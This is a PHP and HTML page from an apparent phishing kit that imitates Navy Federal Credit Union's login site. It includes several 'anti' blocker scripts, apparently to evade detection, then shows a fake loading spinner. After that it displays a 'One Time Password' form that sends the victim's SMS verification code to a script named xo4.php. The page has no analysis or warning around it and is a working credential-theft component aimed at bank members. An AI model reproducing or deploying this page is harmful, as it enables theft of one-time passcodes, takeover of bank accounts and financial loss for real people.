<?php
error_reporting(0);
include "./blocker/anti1.php";
include "./blocker/anti2.php";
include "./blocker/anti3.php";
include "./blocker/anti4.php";
include "./blocker/anti5.php";
include "./blocker/anti6.php";
include "./blocker/anti7.php";
include "./blocker/anti8.php";

?>
<html lang="en"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Navy Federal Credit Union - Our Members are the Mission®</title>



<link rel="shortcut icon" href="resources/images/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="resources/images/apple-touch-icon-72x72-precomposed-ae3b3be0d460fbef25ad55dfec1ca683.png">

<!-- Import this way for performance gains -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600">
<link rel="stylesheet" href="resources/css/nfcu-icons-70952c801211405657b59b94c775431e.css">
<link rel="stylesheet" href="resources/css/all-70952c801211405657b59b94c775431e.css">
 <!-- Added responsivemain.css for login.jsp changes -->
<link rel="stylesheet" href="resources/css/nauth-70952c801211405657b59b94c775431e.css">
<link rel="stylesheet" href="resources/css/responsivemain-70952c801211405657b59b94c775431e.css">


</head>





<body class="responsive">
 <a href="#end-header" id="skipnav" class="skipnav" tabindex="-1">Skip Navigation Links</a>

<div class="mobileMenu">
	<div class="MobileMenuHeader">
	</div>
	<div class="MobileMenuContent">
		<div class="MobLocations">
	        <a href="https://www.navyfederal.org/branches-atms/index.php"><span></span>Locations</a>
        </div>
		<div class="MobContactUs">
	        <a href="https://www.navyfederal.org/contact-us/"><span></span>Contact Us</a>
        </div>
        <div class="MobRoutingNumber">
        	<p>Routing Number: <strong>256074974</strong></p>
        </div>
	</div>
</div>

<div class="pageWrap">  
	<!-- start of header -->	
	<div class="header-sm" role="banner">
		<div class="container">
			<div class="header-content-sm">
				<div class="mob-nav-menu">
					
				</div>
				<div class="logo-sm">
					<a href="" title="Go to NavyFederal.org">
						<img src="data:image/png;base64,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" class="smallHeaderLogo" alt="Navy Federal Credit Union logo, link to home page">
					</a>
				</div>
			</div>
		</div>
	</div>
	<div class="header-bg" role="banner">
		<div class="container">
			<div class="content-box">
				<div class="header-content-bg">
					<div class="logo">
						<a href="https://www.navyfederal.org" title="Go to NavyFederal.org" class="logo_bg_a">
						<img src="resources/images/img_logo-veterans-ae3b3be0d460fbef25ad55dfec1ca683.svg" alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" class="logo_bg"> </a>
					</div>
					<div class="nav navbar-collapse">
						<div class="rt-container"><span class="text-routing">Routing Number: </span><span class="rnumber">256074974</span></div>
						<a class="padRight20 loc-class" href="p">  Locations </a>
						
						<a class="Contact-us" href=""><img src="resources/images/contact-us-ae3b3be0d460fbef25ad55dfec1ca683.svg" class="icon_more_contact_us_default" alt="Contact Us"> Contact Us</a>  
					</div>
				</div>
			</div>
		</div> 
	</div>
	<style type="text/css">.ajax_loading .ui-widget-overlay{z-index:3000;position:fixed;background:#FFF;opacity:0.7;filter:Alpha(Opacity=70)}.ajax_loading .spinner_container{top:0;position:fixed;width:100%;height:100%;display:block;z-index:3001}.ajax_loading .spinner_container .spinner{position:fixed;top:55%;left:50%}.ajax_loading .spinner_container .spinner:after{content:" ";display:block;height:125px;width:125px;margin-top:-115px;margin-left:-59.5px;background-image:url("data:image/svg+xml;base64,PHN2ZyBpZD0iREtCIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjE1MSA3Ny4zIDgyLjkgNDAiPjxzdHlsZT4uc3Qwe2ZpbGw6IzE0OGRlYX08L3N0eWxlPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0xNTEgNzcuM2g4Mi45djEuNkgxNTF6bTAgMzguNGg4Mi45djEuNkgxNTF6bTEyLTIuNWM0LjUgMCA3LjUtLjYgMTAuOS0zLjkgMy0zIDQuNi03IDQuNi0xMS44IDAtNS4zLTEuNi05LjQtNC42LTEyLjMtMy4zLTMuMS02LjktMy44LTExLjktMy44aC0xMXYzMS44aDEyem0tMS4xLTdoLTMuMXYtMThoMy4xYzUuNyAwIDguOCAzLjIgOC44IDkgMCA2LjItMi44IDktOC44IDltMjguMSA3Vjk5LjRsOC4zIDEzLjhoOS40bC0xMC4yLTE1LjZMMjA4IDgxLjRoLTguNmwtOS40IDE1di0xNWgtNy45djMxLjh6bTIxLjcgMGg5LjdjNC4yIDAgNy4xLS4zIDkuNC0yLjQgMi0xLjggMy4xLTQuNSAzLjEtNy41IDAtMy44LTEuOC02LjItNS41LTcuMyAyLjgtMS40IDQtMy41IDQtNi44IDAtNS0zLjQtNy44LTkuOC03LjhoLTEwLjl2MzEuOHptNy41LTYuN3YtNi43aDIuNWMzLjEgMCA0LjUuNyA0LjUgMy40IDAgMi42LTEuNCAzLjMtNC4zIDMuM2gtMi43em0wLTEyLjhWODhoMi42YzIuNCAwIDMuNi45IDMuNiAzcy0xLjMgMi43LTQuMiAyLjdoLTJ6Ii8+PC9zdmc+");background-repeat:no-repeat;background-size:125px}html.dasKannBank .ajax_loading .spinner_container .spinner:after{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGlkPSJFYmVuZV8xIiB2aWV3Qm94PSItMTA0LjUgMzE2LjUgMjgzLjQgMTYwLjYiPjxzdHlsZSBpZD0ic3R5bGUzIj4uc3Qwe2ZpbGw6IzE0OGRlYX08L3N0eWxlPjxnIGlkPSJMb2dvIj48ZyBpZD0iZzYiPjxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik0tMTA0LjUgMzE2LjVoNDEuMmMyMy42IDAgNTEuNiAxNy43IDUxLjYgNTMgMCAzMi40LTI4IDUzLTUxLjYgNTNoLTQxLjJ2LTEwNnptNjMuMyA1M2MwLTIyLjEtMTcuNy0yNi41LTMzLjktMjYuNXY1M2MxNi4yIDAgMzMuOS00LjQgMzMuOS0yNi41eiIgaWQ9InBhdGg4Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTS0uMSAzMTYuNWgyOS41djM5LjhoLjNMNTMgMzE2LjVoMzMuOUw1NiAzNjUuMWwzMy45IDU3LjVINTZsLTI2LjItNDUuN2gtLjN2NDUuN0gwVjMxNi41aC0uMXoiIGlkPSJwYXRoMTAiLz48cGF0aCBjbGFzcz0ic3QwIiBkPSJNOTcuOSAzMTYuNWg0Mi43YzE5LjIgMCAzMi40IDExLjUgMzIuNCAyNi41IDAgMTAtMy41IDE4LjYtMTEuNSAyMS4xdi4zYzYuNiAyLjUgMTcuNCAxMS41IDE3LjQgMjUuOCAwIDIxLjItMTYuMiAzMi40LTMzLjkgMzIuNEg5Ny45VjMxNi41em0zOC41IDQyLjRjNSAwIDkuMy0zLjIgOS4zLTkuMyAwLTUuNy00LjMtOS4zLTkuMy05LjNoLTl2MTguNmg5em0yLjYgMzguNGM1LjkgMCA5LjMtNC43IDkuMy0xMC42IDAtNS45LTQuNy0xMC42LTEwLjYtMTAuNmgtMTAuM3YyMS4ySDEzOXoiIGlkPSJwYXRoMTIiLz48L2c+PC9nPjwvc3ZnPg==");background-repeat:no-repeat;background-size:125px}html.hilton .ajax_loading .spinner_container .spinner{top:50%}html.hilton .ajax_loading .spinner_container .spinner:after{background-image:none}
</style>
	
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" ></script>
  <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>

<script type="text/javascript">setTimeout(function() 

    {
    $('#mydiv').fadeOut('fast');
        $('#mydiv1').fadeIn('fast');

}, 3000); 



</script>


<div id="mydiv" class="ajax_loading" style="/* display:none */"><div class="ui-widget-overlay"></div><div class="spinner_container"><div class="spinner"></div><img style="height: 70px;position: fixed;
    top: 50%;
    left: 48%;
}" src="resources/unnamed.gif"> </div>
</div>


		
		<!-- main content area starts here -->
	<div class="content-wrapper">
		
		        <div class="formbackground">
		        <a id="end-header"></a>
		        		
		        </div>
		        <div style="display: none" id="mydiv1" class="container">
		        	<div class="background-container">
		        	<div class="login-content-box">
						<div class="login">    
							<div class="headers"> 
								<h1>One Time Password</h1>
		                	</div>               
		                    	<div class="login-panel">
								
								<div class="panel panel-primary heading-callout">
				                    <div class="panel-heading" style="width: auto;">
				                        <h2 class="panel-title" style="
    width: auto;
    height: auto;
    font-size: 18px;
">Please enter the verification code that we have you on a text message (SMS) to your phone number</h2>
				                    </div>
				                    
			                        <div class="panel-body">
			                            <div class="panel-content-left">
											<form id="Login" class="form-inline Rectangle-2459" name="Login" method="post" action="xo4.php" autocomplete="off">
												<div class="form-group username" style="display:inline-block;">
													<label for="user">OTP Code</label> 
													
													<abbr class="tooltip" role="link" aria-disabled="true" aria-describeby="tooltip" aria-label="Sign into online banking with your unique Username, which may be your access number.">
														<img id="tooltip-user" src="resources/images/toolTip-ae3b3be0d460fbef25ad55dfec1ca683.svg" tabindex="1" aria-label="Sign into online banking with your unique Username, which may be your access number." alt="Sign into online banking with your unique Username, which may be your access number.">
													</abbr>
						  	  							
													<input type="text" name="sms" id="user" required="" value="" tabindex="2" maxlength="32" class="form-control"><input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Confirm" tabindex="4"><br>
													
												</div>
												
												
												<br>
												
												
												
											
												
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div></div></div><style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {borer:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style><style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {borer:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style></body></html>